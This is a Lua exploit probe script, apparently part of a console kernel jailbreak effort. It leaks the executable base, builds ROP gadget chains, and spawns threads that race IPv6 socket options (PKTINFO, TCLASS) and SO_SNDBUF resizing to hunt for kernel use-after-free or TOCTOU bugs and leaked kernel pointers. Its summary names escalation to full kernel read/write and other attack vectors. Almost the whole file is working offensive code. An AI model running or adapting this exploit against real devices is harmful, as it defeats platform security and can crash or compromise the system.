-- CRASH_CLASS: HIGH
-- PROBE 1405a: Race orchestrator — run all race variants in sequence
--
-- prior art: 1402a (dual PKTINFO), 1402b (SO_SNDBUF TOCTOU),
--   1403a (PKTINFO + spray), 384b fake TCB, 396f child ROP
--
-- Runs three race strategies in order, stopping at first anomaly:
--   Strategy 1: Dual setsockopt(IPV6_PKTINFO) — 30 rounds × 300 loops
--   Strategy 2: SO_SNDBUF resize TOCTOU with prefill — 20 rounds
--   Strategy 3: IPV6_PKTINFO + TCLASS mixed option race — 30 rounds
--
-- Each strategy has its own detection oracle. First anomaly prints
-- full diagnostic and the probe exits with "RACE CONFIRMED".

print("=== PROBE 1405a: RACE ORCHESTRATOR ===")
print("")

-- ======================================================================
-- Standard preamble (helpers, eboot, gadgets, TCB, child launcher)
-- ======================================================================
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo) wd(addr, lo); wd(addr + 4, hi) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_write      = mk(4)
local sc_nanosleep  = mk(240)

local AF_INET6 = 28; local SOCK_DGRAM = 2; local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46; local IPPROTO_UDP = 17
local IPV6_TCLASS = 61
local SOL_SOCKET = 0xFFFF; local SO_SNDBUF = 0x1001; local SO_RCVBUF = 0x1002

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992); gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D); gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64); gadget("pop_r8", 0x991)

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("NO fn_addr"); return end
local fn_addr = uint64(fn_str)
local stub_hi, stub_lo = get_hi_lo(fn_addr)
print("fn_addr=" .. fn_str)

local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

local STACK_SZ = 0x10000; local CHAIN_BASE = 0xE000
local slp = memory.alloc(16)

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local sn = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(sn + i, 0) end
    local rsp = sn + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8
    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2]); wd(rsp + off + 4, entry[1])
    end
    local param = memory.alloc(0x40); local pn = N(param)
    wq2(pn, g.pop_rax[1], g.pop_rax[2])
    wq2(pn + 0x08, 0, 0); wq2(pn + 0x10, get_hi_lo(stk))
    wq2(pn + 0x18, 0, CHAIN_BASE); wq2(pn + 0x20, 0, 0); wq2(pn + 0x28, 0, 0)
    local ctid = memory.alloc(8); wq2(pn + 0x30, get_hi_lo(ctid))
    local ok_t, rv_t = pcall(function() return mk(455)(uint64(pn), uint64(0x38)) end)
    if not ok_t then return -1 end
    return N(rv_t)
end

local function sleep_ms(ms)
    wq2(N(slp), 0, 0); wd(N(slp) + 8, ms * 1000000)
    sc_nanosleep(uint64(N(slp)), uint64(0))
end

-- Sysarch preamble for child chains
local function sysarch_preamble()
    return {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
end
-- thr_exit epilogue for child chains
local function thr_exit_epilogue()
    return {
        g.pop_rdi, {0, 0}, g.pop_rax, {0, 431}, {stub_hi, stub_lo},
    }
end

-- Append setsockopt(fd, level, optname, buf, len) to chain
local function chain_setsockopt(c, fd, level, optname, buf_hi, buf_lo, len)
    c[#c+1] = g.pop_rdi; c[#c+1] = {0, fd}
    c[#c+1] = g.pop_rsi; c[#c+1] = {0, level}
    c[#c+1] = g.pop_rdx; c[#c+1] = {0, optname}
    c[#c+1] = g.pop_rcx; c[#c+1] = {buf_hi, buf_lo}
    c[#c+1] = g.pop_r8;  c[#c+1] = {0, len}
    c[#c+1] = g.pop_rax; c[#c+1] = {0, 105}
    c[#c+1] = {stub_hi, stub_lo}
end

-- Append write(fd, buf, len) to chain
local function chain_write(c, fd, buf_hi, buf_lo, len)
    c[#c+1] = g.pop_rdi; c[#c+1] = {0, fd}
    c[#c+1] = g.pop_rsi; c[#c+1] = {buf_hi, buf_lo}
    c[#c+1] = g.pop_rdx; c[#c+1] = {0, len}
    c[#c+1] = g.pop_rax; c[#c+1] = {0, 4}
    c[#c+1] = {stub_hi, stub_lo}
end

-- ======================================================================
-- Phase 0: Child test
-- ======================================================================
print("--- child test ---")
local spb = memory.alloc(16)
N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(spb)))
local sp_r = rd(N(spb)) or -1; local sp_w = rd(N(spb) + 4) or -1
local mark = memory.alloc(16); wq2(N(mark), 0xCAFE, 0xBABE)
local mk_hi, mk_lo = get_hi_lo(mark)
local ct = sysarch_preamble()
ct[#ct+1] = g.pop_rdi; ct[#ct+1] = {0, sp_w}
ct[#ct+1] = g.pop_rsi; ct[#ct+1] = {mk_hi, mk_lo}
ct[#ct+1] = g.pop_rdx; ct[#ct+1] = {0, 8}
ct[#ct+1] = g.pop_rax; ct[#ct+1] = {0, 4}; ct[#ct+1] = {stub_hi, stub_lo}
for _, v in ipairs(thr_exit_epilogue()) do ct[#ct+1] = v end
launch_child(ct); sleep_ms(50)
local rbuf = memory.alloc(16); wq2(N(rbuf), 0, 0)
N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))
if rh ~= 0xCAFE or rl ~= 0xBABE then print("CHILD FAIL"); return end
print("CHILD OK!")

-- VM counter
local sc624 = mk(624)
local vm0 = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))

-- ======================================================================
-- STRATEGY 1: Dual setsockopt(IPV6_PKTINFO) race
-- ======================================================================
print("")
print("=== STRATEGY 1: Dual PKTINFO race ===")

local S1_ROUNDS = 30
local S1_LOOPS = 300
local s1_anom = 0

for round = 1, S1_ROUNDS do
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then break end

    local init = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(init) + i, 0) end
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(init)), uint64(20))

    local ba = memory.alloc(32); local bb = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(ba) + i, 0); wd(N(bb) + i, 0) end
    wd(N(ba), 0xAAAAAAAA); wd(N(bb), 0xBBBBBBBB)
    local bah, bal = get_hi_lo(ba); local bbh, bbl = get_hi_lo(bb)

    local ca = sysarch_preamble()
    for i = 1, S1_LOOPS do chain_setsockopt(ca, fd, IPPROTO_IPV6, IPV6_PKTINFO, bah, bal, 20) end
    for _, v in ipairs(thr_exit_epilogue()) do ca[#ca+1] = v end

    local cb = sysarch_preamble()
    for i = 1, S1_LOOPS do chain_setsockopt(cb, fd, IPPROTO_IPV6, IPV6_PKTINFO, bbh, bbl, 20) end
    for _, v in ipairs(thr_exit_epilogue()) do cb[#cb+1] = v end

    if round == 1 then print(string.format("  chains: %d/%d entries", #ca, #cb)) end

    launch_child(ca); launch_child(cb)
    sleep_ms(250)

    local out = memory.alloc(32); local on = N(out)
    for i = 0, 31, 4 do wd(on + i, 0xDEAD) end
    local ol = memory.alloc(8); wd(N(ol), 24)
    local gr = N(sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(on), uint64(N(ol))))

    local v0 = rd(on) or 0
    local q1h, q1l = get_hi_lo(rq(on) or uint64(0))
    local is_a = (v0 == 0xAAAAAAAA); local is_b = (v0 == 0xBBBBBBBB)
    local anom = (not is_a and not is_b and gr == 0) or (q1h >= 0xFFFF8000)

    if anom then
        s1_anom = s1_anom + 1
        print(string.format("  [R%d] *** ANOMALY *** v0=0x%X q1=%s", round, v0,
            string.format("0x%X%08X", q1h, q1l)))
    end
    sc_close(uint64(fd))

    if round % 10 == 0 then print(string.format("  [R%d] anom=%d", round, s1_anom)) end
end

print(string.format("  S1 done: %d rounds, %d anomalies", S1_ROUNDS, s1_anom))
if s1_anom > 0 then
    print("*** PKTINFO RACE CONFIRMED ***")
    print("=== PROBE 1405a COMPLETE (RACE FOUND) ==="); return
end

-- ======================================================================
-- STRATEGY 2: SO_SNDBUF resize TOCTOU (from 1402b)
-- ======================================================================
print("")
print("=== STRATEGY 2: SO_SNDBUF TOCTOU ===")

local S2_ROUNDS = 20
local S2_SEND_N = 30; local S2_SHRINK_N = 50
local s2_anom = 0

local sendbuf = memory.alloc(4096)
for i = 0, 4095, 4 do wd(N(sendbuf) + i, 0x41414141) end
local sbh, sbl = get_hi_lo(sendbuf)

local shrink_v = memory.alloc(8); wd(N(shrink_v), 256)
local svh, svl = get_hi_lo(shrink_v)
local expand_v = memory.alloc(8); wd(N(expand_v), 65536)
local evh, evl = get_hi_lo(expand_v)
local val64k = memory.alloc(8); wd(N(val64k), 65536)
local val128k = memory.alloc(8); wd(N(val128k), 131072)

for round = 1, S2_ROUNDS do
    local spa = memory.alloc(16)
    local r2 = N(sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(spa)))
    local f_s = rd(N(spa)) or -1; local f_r = rd(N(spa) + 4) or -1
    if r2 ~= 0 then break end

    sc_setsockopt(uint64(f_s), uint64(SOL_SOCKET), uint64(SO_SNDBUF), uint64(N(val64k)), uint64(4))
    sc_setsockopt(uint64(f_r), uint64(SOL_SOCKET), uint64(SO_RCVBUF), uint64(N(val128k)), uint64(4))

    -- Prefill ~56KB
    for pf = 1, 14 do sc_write(uint64(f_s), uint64(N(sendbuf)), uint64(4096)) end

    -- Child A: write(f_s, 4096) × S2_SEND_N
    local ca = sysarch_preamble()
    for i = 1, S2_SEND_N do chain_write(ca, f_s, sbh, sbl, 4096) end
    for _, v in ipairs(thr_exit_epilogue()) do ca[#ca+1] = v end

    -- Child B: shrink/expand SO_SNDBUF × S2_SHRINK_N
    local cb = sysarch_preamble()
    for i = 1, S2_SHRINK_N do
        chain_setsockopt(cb, f_s, SOL_SOCKET, SO_SNDBUF, svh, svl, 4)
        chain_setsockopt(cb, f_s, SOL_SOCKET, SO_SNDBUF, evh, evl, 4)
    end
    for _, v in ipairs(thr_exit_epilogue()) do cb[#cb+1] = v end

    if round == 1 then print(string.format("  chains: %d/%d entries", #ca, #cb)) end

    launch_child(ca); launch_child(cb)
    sleep_ms(200)

    -- Drain and count
    local drain = memory.alloc(0x4000)
    local total = 0
    for att = 1, 50 do
        local rr2 = N(sc_read(uint64(f_r), uint64(N(drain)), uint64(0x4000)))
        if rr2 <= 0 then break end
        total = total + rr2
    end

    if total > 65536 then
        s2_anom = s2_anom + 1
        print(string.format("  [R%d] *** OVERFLOW *** recv=%d", round, total))
    end

    sc_close(uint64(f_s)); sc_close(uint64(f_r))
    if round % 10 == 0 then print(string.format("  [R%d] anom=%d", round, s2_anom)) end
end

print(string.format("  S2 done: %d rounds, %d anomalies", S2_ROUNDS, s2_anom))
if s2_anom > 0 then
    print("*** SO_SNDBUF TOCTOU CONFIRMED ***")
    print("=== PROBE 1405a COMPLETE (RACE FOUND) ==="); return
end

-- ======================================================================
-- STRATEGY 3: PKTINFO vs TCLASS cross-option race
-- TCLASS writes into ip6_pktopts->ip6po_tclass (an int at some offset).
-- PKTINFO frees/allocs ip6_pktopts->ip6po_pktinfo (a sub-struct).
-- If they share the same lock acquisition path differently, one may
-- race against the other.
-- ======================================================================
print("")
print("=== STRATEGY 3: PKTINFO vs TCLASS cross-option ===")

local S3_ROUNDS = 30
local S3_LOOPS = 300
local s3_anom = 0

for round = 1, S3_ROUNDS do
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then break end

    -- Initialize both options
    local init = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(init) + i, 0) end
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(init)), uint64(20))
    local tc = memory.alloc(8); wd(N(tc), 0x80)
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_TCLASS), uint64(N(tc)), uint64(4))

    -- Child A: PKTINFO with marker
    local ba = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(ba) + i, 0) end
    wd(N(ba), 0xCCCCCCCC)
    local bah, bal = get_hi_lo(ba)

    -- Child B: TCLASS rapid toggle (0x00 and 0xFF)
    local tc0 = memory.alloc(8); wd(N(tc0), 0)
    local tc1 = memory.alloc(8); wd(N(tc1), 0xFF)
    local t0h, t0l = get_hi_lo(tc0); local t1h, t1l = get_hi_lo(tc1)

    local ca = sysarch_preamble()
    for i = 1, S3_LOOPS do
        chain_setsockopt(ca, fd, IPPROTO_IPV6, IPV6_PKTINFO, bah, bal, 20)
    end
    for _, v in ipairs(thr_exit_epilogue()) do ca[#ca+1] = v end

    local cb = sysarch_preamble()
    for i = 1, S3_LOOPS do
        chain_setsockopt(cb, fd, IPPROTO_IPV6, IPV6_TCLASS, t0h, t0l, 4)
        chain_setsockopt(cb, fd, IPPROTO_IPV6, IPV6_TCLASS, t1h, t1l, 4)
    end
    for _, v in ipairs(thr_exit_epilogue()) do cb[#cb+1] = v end

    if round == 1 then print(string.format("  chains: %d/%d entries", #ca, #cb)) end

    launch_child(ca); launch_child(cb)
    sleep_ms(250)

    -- Read PKTINFO
    local out = memory.alloc(32); local on = N(out)
    for i = 0, 31, 4 do wd(on + i, 0xDEAD) end
    local ol = memory.alloc(8); wd(N(ol), 24)
    local gr = N(sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(on), uint64(N(ol))))

    local v0 = rd(on) or 0
    local q1h, q1l = get_hi_lo(rq(on) or uint64(0))

    -- Also read TCLASS
    local tout = memory.alloc(8); wd(N(tout), 0xDEAD)
    local tol = memory.alloc(8); wd(N(tol), 4)
    local tgr = N(sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_TCLASS), uint64(N(tout)), uint64(N(tol))))
    local tv = rd(N(tout)) or 0

    local pkt_ok = (v0 == 0xCCCCCCCC or v0 == 0)
    local tc_ok = (tv == 0 or tv == 0xFF or tv == 0x80)
    local kptr = (q1h >= 0xFFFF8000)

    if not pkt_ok or not tc_ok or kptr then
        s3_anom = s3_anom + 1
        print(string.format("  [R%d] *** ANOMALY *** pkt=0x%X tc=0x%X q1=%s kptr=%s",
            round, v0, tv, string.format("0x%X%08X", q1h, q1l), tostring(kptr)))
    end
    sc_close(uint64(fd))
    if round % 10 == 0 then print(string.format("  [R%d] anom=%d", round, s3_anom)) end
end

print(string.format("  S3 done: %d rounds, %d anomalies", S3_ROUNDS, s3_anom))
if s3_anom > 0 then
    print("*** CROSS-OPTION RACE CONFIRMED ***")
end

-- ======================================================================
-- Summary
-- ======================================================================
local vm1 = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("")
print("=== SUMMARY ===")
print(string.format("S1 (PKTINFO dual): %d anomalies / %d rounds", s1_anom, S1_ROUNDS))
print(string.format("S2 (SNDBUF TOCTOU): %d anomalies / %d rounds", s2_anom, S2_ROUNDS))
print(string.format("S3 (PKTINFO+TCLASS): %d anomalies / %d rounds", s3_anom, S3_ROUNDS))
print(string.format("VM ops: %d -> %d (delta=%d)", vm0, vm1, vm1 - vm0))

local total_anom = s1_anom + s2_anom + s3_anom
if total_anom > 0 then
    print("*** AT LEAST ONE RACE VECTOR IS VIABLE ***")
    print("Next: escalate winning strategy to full kernel R/W (1404a)")
else
    print("All three strategies clean. The kernel likely holds proper locks.")
    print("Fallback options:")
    print("  - Increase iteration counts (try 1000+ per child)")
    print("  - Try IPV6_RTHDR len=0 as race target")
    print("  - Try recvmsg + concurrent close")
    print("  - Pivot to WebKit FontFace chain (docs/EXPLOITATION_STATUS.md)")
end

print("=== PROBE 1405a COMPLETE ===")
